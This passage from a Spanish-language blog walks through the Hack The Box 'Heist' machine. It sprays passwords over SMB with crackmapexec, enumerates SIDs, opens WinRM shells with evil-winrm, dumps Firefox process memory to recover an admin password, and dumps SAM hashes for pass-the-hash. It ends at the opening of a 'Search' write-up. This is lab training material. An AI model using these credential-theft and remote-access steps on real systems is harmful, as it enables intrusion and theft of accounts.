SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\h</span>azard:stealth1agent
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Enumerated shares
SMB         10.129.116.26   445    SUPPORTDESK      Share           Permissions     Remark
SMB         10.129.116.26   445    SUPPORTDESK      <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.116.26   445    SUPPORTDESK      ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.116.26   445    SUPPORTDESK      C<span class="nv">$ </span>                             Default share
SMB         10.129.116.26   445    SUPPORTDESK      IPC<span class="nv">$ </span>           READ            Remote IPC
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a enumerar por <code class="language-plaintext highlighter-rouge">RPC</code> ya que el puerto esta abierto.</p>
  </li>
  <li>
    <p>Pero no podemos.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hazard%stealth1agent"</span> 10.129.116.26
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
</code></pre></div></div>

<ul>
  <li>Algo que podemos hacer es conectarnos al panel de <code class="language-plaintext highlighter-rouge">login</code> ya que tenemos credenciales validas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/7.png" />
</p>

<ul>
  <li>Nos piden un email pero a saber cual si probamos con el de la maquina no nos deja.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/8.png" />
</p>

<h2 id="shell-as-chase">Shell as Chase</h2>

<ul>
  <li>Bueno algo que podemos hacer es usar <code class="language-plaintext highlighter-rouge">lookupsid.py</code> con esto podemos enumerar mas usuarios validos a nivel de sistema a partir de sus SID correspondientes pero necesitamos el dominio de la maquina a si que vamos a ver cual es con la herramienta de <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y encontramos nuevos usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-lookupsid SUPPORTDESK/hazard:stealth1agent@10.129.116.26
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Brute forcing SIDs at 10.129.116.26
<span class="o">[</span><span class="k">*</span><span class="o">]</span> StringBinding ncacn_np:10.129.116.26[<span class="se">\p</span>ipe<span class="se">\l</span>sarpc]
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
501: SUPPORTDESK<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
503: SUPPORTDESK<span class="se">\D</span>efaultAccount <span class="o">(</span>SidTypeUser<span class="o">)</span>
504: SUPPORTDESK<span class="se">\W</span>DAGUtilityAccount <span class="o">(</span>SidTypeUser<span class="o">)</span>
513: SUPPORTDESK<span class="se">\N</span>one <span class="o">(</span>SidTypeGroup<span class="o">)</span>
1008: SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>SidTypeUser<span class="o">)</span>
1009: SUPPORTDESK<span class="se">\s</span>upport <span class="o">(</span>SidTypeUser<span class="o">)</span>
1012: SUPPORTDESK<span class="se">\C</span>hase <span class="o">(</span>SidTypeUser<span class="o">)</span>
1013: SUPPORTDESK<span class="se">\J</span>ason <span class="o">(</span>SidTypeUser<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver si uno de los usuarios que tenemos reutiliza alguna contraseña de las que tenemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> users.txt <span class="nt">-p</span> creds.txt <span class="nt">--continue-on-success</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\a</span>dmin:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\h</span>azard:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\h</span>azard:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\h</span>azard:stealth1agent
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\C</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\C</span>hase:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\C</span>hase:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:stealth1agent STATUS_LOGON_FAILURE
</code></pre></div></div>

<ul>
  <li>El usuario Chase usa una contraseña que tenemos además el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Chase'</span> <span class="nt">-p</span> <span class="s1">'Q4)sJu\Y8qz*A3?d'</span>
SMB         10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span>
HTTP        10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.116.26:5985/wsman
WINRM       10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\C</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora podemos usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> para conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Chase'</span> <span class="nt">-p</span> <span class="s1">'Q4)sJu\Y8qz*A3?d'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>supportdesk<span class="se">\c</span>hase
</code></pre></div></div>

<h1 id="user-flag">user flag</h1>

<ul>
  <li>Podemos leer la <code class="language-plaintext highlighter-rouge">user flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
03b82a9b1533ba49d298214751e7bd51
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>No tenemos ningún privilegio interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver los procesos que esta corriendo la maquina.</p>
  </li>
  <li>
    <p>Y vemos que esta corriendo el Firefox.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; ps

Handles  NPM<span class="o">(</span>K<span class="o">)</span>    PM<span class="o">(</span>K<span class="o">)</span>      WS<span class="o">(</span>K<span class="o">)</span>     CPU<span class="o">(</span>s<span class="o">)</span>     Id  SI ProcessName
<span class="nt">-------</span>  <span class="nt">------</span>    <span class="nt">-----</span>      <span class="nt">-----</span>     <span class="nt">------</span>     <span class="nt">--</span>  <span class="nt">--</span> <span class="nt">-----------</span>
    467      18     2288       5428               364   0 csrss
    287      13     1896       5020               476   1 csrss
    357      15     3484      14528              4936   1 ctfmon
    253      14     3956      13344              3868   0 dllhost
    166       9     1868       9768       0.02   6492   1 dllhost
    617      32    30384      57840               956   1 dwm
   1494      58    23864      78872              5236   1 explorer
   1087      69   129340     206756       4.94   6240   1 firefox
    347      20    10204      38616       0.08   6348   1 firefox
    401      35    34804      93476       0.73   6580   1 firefox
    378      28    22008      58588       0.38   6788   1 firefox
    355      25    16512      38936       0.08   7044   1 firefox
     49       6     1496       3892               768   0 fontdrvhost
     49       6     1776       4636               776   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    973      23     5820      14900               624   0 lsass
    223      13     2948      10200              3928   0 msdtc
      0      12      324      15144                88   0 Registry
    273      14     2988      14820              4792   1 RuntimeBroker
    144       8     1644       7540              5716   1 RuntimeBroker
    304      16     5596      16948              5840   1 RuntimeBroker
    664      32    19612      61404              5640   1 SearchUI
    541      11     4732       9448               608   0 services
    691      29    14984      52012              5516   1 ShellExperienceHost
    443      17     4928      24064              4976   1 sihost
     53       3      516       1156               264   0 smss
    471      22     5928      16200              2500   0 spoolsv
    308      20     9708      14372               328   0 svchost
    199      12     1964       9520               368   0 svchost
    223      11     2844      10948               592   0 svchost
    149       9     1700      11584               704   0 svchost
     85       5      888       3792               724   0 svchost
    861      20     7020      22312               748   0 svchost
    310      16    13188      15460               792   0 svchost
    864      16     5180      11684               856   0 svchost
    255      10     1992       7676               904   0 svchost
    127       7     1544       6220               964   0 svchost
    379      13    10864      14812               976   0 svchost
    337      16     4732      13572              1004   0 svchost
    140       7     1304       5688              1132   0 svchost
    127      17     3640       7492              1164   0 svchost
    184       9     1776       7548              1232   0 svchost
    230      12     2668      11276              1240   0 svchost
    154       7     1208       5616              1252   0 svchost
    429       9     2752       8824              1260   0 svchost
    216       9     2128       7588              1324   0 svchost
    170      10     1756       7940              1364   0 svchost
    249      15     3236       8564              1404   0 svchost
    304      12     2084       9000              1412   0 svchost
    366      17     5104      14212              1428   0 svchost
    347      14     4588      11828              1532   0 svchost
    191      12     2076      11936              1548   0 svchost
    163      10     2504       7424              1680   0 svchost
    167       9     2160       7552              1752   0 svchost
    323      10     2604       8420              1780   0 svchost
    408      32     9056      17164              1804   0 svchost
    194      11     1972       8136              1884   0 svchost
    209      11     2780      11948              2032   0 svchost
    238      11     2504       9720              2040   0 svchost
    338      18    14776      31468              2168   0 svchost
    465      17     3376      11856              2192   0 svchost
    166      12     3904      10788              2588   0 svchost
    179      22     2496       9844              2596   0 svchost
    460      19    11424      26096              2604   0 svchost
    261      13     2568       7880              2624   0 svchost
    396      16    11124      20352              2648   0 svchost
    133       9     1616       6548              2684   0 svchost
    136       8     1508       6144              2720   0 svchost
    205      11     2260       8324              2728   0 svchost
    126       7     1224       5340              2740   0 svchost
    238      15     4792      11824              2836   0 svchost
    209      12     1872       7448              2844   0 svchost
    169      10     2132      13248              2852   0 svchost
    263      19     3588      12100              2864   0 svchost
    441      62    14756      23396              2900   0 svchost
    193      15     6000      10032              2956   0 svchost
    383      23     3308      12232              3184   0 svchost
    163       9     3016       7600              3948   0 svchost
    255      14     3188      13832              4468   0 svchost
    171       9     1476       7224              4492   0 svchost
    167       9     4212      11848              4596   0 svchost
    189      12     2696      13352              4860   0 svchost
    230      12     3036      13592              4992   1 svchost
    369      18     5652      27096              5016   1 svchost
    254      13     3296      12508              5448   0 svchost
    122       7     1232       5600              6188   0 svchost
    115       7     1236       5356              7032   0 svchost
   1892       0      192         88                 4   0 System
    210      20     3900      12436              5052   1 taskhostw
    167      11     2900      10840              2764   0 VGAuthService
    136       9     1808       7408              2532   1 vm3dservice
    142       8     1688       6888              2772   0 vm3dservice
    383      22     9320      21796              2796   0 vmtoolsd
    236      18     5048      15216              4828   1 vmtoolsd
    242      21     5912      14768              6708   0 w3wp
    171      11     1448       6852               468   0 wininit
    282      13     2812      12796               532   1 winlogon
    349      16     8968      18376              4024   0 WmiPrvSE
    824      27    53908      69688       0.63   6012   0 wsmprovhost
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos usar una herramienta <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">https://learn.microsoft.com/en-us/sysinternals/downloads/procdump</a> para realizar un volcado de un PID que le demos en este caso el de Firefox que analizaremos y ver las <code class="language-plaintext highlighter-rouge">strings</code> .</p>
  </li>
  <li>
    <p>Tenemos los <code class="language-plaintext highlighter-rouge">.exe</code> pero solo vamos a subir 1 ala maquina <strong>procdump64.exe</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l Procdump.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 731622 bytes <span class="o">(</span>715 KiB<span class="o">)</span>

Listing archive: Procdump.zip

<span class="nt">--</span>
Path <span class="o">=</span> Procdump.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 731622

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-11-03 15:55:14 .....       791960       364222  procdump.exe
2022-11-03 15:55:14 .....       424856       196343  procdump64.exe
2022-11-03 15:55:14 .....       407952       167513  procdump64a.exe
2022-11-03 15:55:00 .....         7490         3120  Eula.txt
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-11-03 15:55:14            1632258       731198  4 files
</code></pre></div></div>

<ul>
  <li>Ahora ya los descomprimimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip Procdump.zip
Archive:  Procdump.zip
  inflating: procdump.exe
  inflating: procdump64.exe
  inflating: procdump64a.exe
  inflating: Eula.txt
</code></pre></div></div>

<ul>
  <li>Y lo subimos ala maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; upload procdump64.exe

Info: Uploading /home/miguel/Hackthebox/Heist/content/procdump64.exe to C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\p</span>rocdump64.exe

Data: 566472 bytes of 566472 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        4/14/2024   3:07 AM         424856 procdump64.exe
<span class="nt">-a----</span>        4/22/2019   9:08 AM            121 todo.txt
<span class="nt">-ar---</span>        4/14/2024   1:56 AM             34 user.txt
</code></pre></div></div>

<ul>
  <li>Necesitamos saber el PID para que funcione.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; ps | findstr firefox
   1083      69   135944     213292       5.03   6240   1 firefox
    347      20    10204      38616       0.08   6348   1 firefox
    401      34    32136      92488       0.78   6580   1 firefox
    378      28    22316      58980       0.38   6788   1 firefox
    355      25    16512      38936       0.08   7044   1 firefox
</code></pre></div></div>

<ul>
  <li>Para hacerlo hacemos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; .<span class="se">\p</span>rocdump64.exe <span class="nt">-accepteula</span>
</code></pre></div></div>

<ul>
  <li>Ahora le pasamos los parámetros y el PID.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; .<span class="se">\p</span>rocdump64.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> 6240

ProcDump v11.0 - Sysinternals process dump utility
Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

<span class="o">[</span>03:54:16] Dump 1 initiated: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\f</span>irefox.exe_240414_035416.dmp
<span class="o">[</span>03:54:16] Dump 1 writing: Estimated dump file size is 493 MB.
<span class="o">[</span>03:54:18] Dump 1 <span class="nb">complete</span>: 493 MB written <span class="k">in </span>2.5 seconds
<span class="o">[</span>03:54:19] Dump count reached.
</code></pre></div></div>

<ul>
  <li>Como el archivo pesa mucho lo que podemos hacer es que mientras se descarga podemos aplicar los <code class="language-plaintext highlighter-rouge">strings</code> y filtrar por <code class="language-plaintext highlighter-rouge">password</code> para ver si encontramos algo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; download C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\</span>
Info: Downloading C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\f</span>irefox.exe_240414_035416.dmp to firefox.exe_240414_035416.dmp
</code></pre></div></div>

<ul>
  <li>Y vemos esto esas credenciales funcionan para logearnos en la pagina web como el Administrator.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content strings firefox.exe_240414_035416.dmp | <span class="nb">grep </span>password
passwordsCountHistogram
passwordmgr-crypto-login
passwordField
passwordElement
goog-passwordwhite-protox0E!
<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\M</span><span class="s2">ozilla Firefox</span><span class="se">\f</span><span class="s2">irefox.exe"</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb&amp;login_password<span class="o">=</span>4dD!5<span class="o">}</span>x/re8]FBuZ&amp;login<span class="o">=</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/9.png" />
</p>

<ul>
  <li>Vemos también que el usuario esta dentro del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span>
SMB         10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span>
HTTP        10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.116.26:5985/wsman
WINRM       10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\A</span>dministrator:4dD!5<span class="o">}</span>x/re8]FBuZ <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as administrator</h2>

<ul>
  <li>Ahora ya podemos ver la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
5c7ac5f3da79f3018d63e5639785415f
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="dumping-sam-hashes">Dumping SAM hashes</h2>

<ul>
  <li>Aquí tenemos los hashes de algunos usuarios para hacer <code class="language-plaintext highlighter-rouge">pass the hash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span> <span class="nt">--sam</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\A</span>dministrator:4dD!5<span class="o">}</span>x/re8]FBuZ <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Dumping SAM hashes
SMB         10.129.116.26   445    SUPPORTDESK      Administrator:500:aad3b435b51404eeaad3b435b51404ee:10f08e9e3787aec843594cfd01f1a6a5:::
SMB         10.129.116.26   445    SUPPORTDESK      Guest:501:aad3b435b51404eeaad3b435b51404ee:d5dd356a1d8a41ceafcd92f3e1795a71:::
SMB         10.129.116.26   445    SUPPORTDESK      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.116.26   445    SUPPORTDESK      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:83f0f384401e2cb89df6f920af3254c7:::
SMB         10.129.116.26   445    SUPPORTDESK      Hazard:1008:aad3b435b51404eeaad3b435b51404ee:551f5fc818a8c5b65d19be1c977f5326:::
SMB         10.129.116.26   445    SUPPORTDESK      support:1009:aad3b435b51404eeaad3b435b51404ee:04456c45a7adb052b6a315cb64992516:::
SMB         10.129.116.26   445    SUPPORTDESK      Chase:1012:aad3b435b51404eeaad3b435b51404ee:bb2e1bf236b6219cb45811d5f2d55068:::
SMB         10.129.116.26   445    SUPPORTDESK      Jason:1013:aad3b435b51404eeaad3b435b51404ee:10608c8436315acb9c703aa7b2e04750:::
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Added 8 SAM hashes to the database
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Search (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/04/12/search.html" rel="alternate" type="text/html" title="HackTheBox - Search (hard)" /><published>2024-04-12T00:00:00-06:00</published><updated>2024-04-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/04/12/search</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/04/12/search.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/03cea0fc2ebc50151c0dfa9e375e3ded.png" />
</p>

<ul>
  <li>En este post vamos a estar resolviendo la maquina Search de la plataforma de Hack The Box que es un entorno de Directorio Activo donde vamos a estar enumerando por los protocolos SMB, RPC, además de estar haciendo un Kerberoast attack y obtener un XLSX que contiene data muy importante como usuarios y credenciales que usaremos para obtener certificados y conectarnos a un Windows PowerShell Web Access donde gracias a bloodhound sabremos la vía para escalar privilegios le vamos a cambiar la contraseña a un usuario que pertenece dentro del grupo Domain Admins y nos conectaremos con wmiexec para ver la ultima flag.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
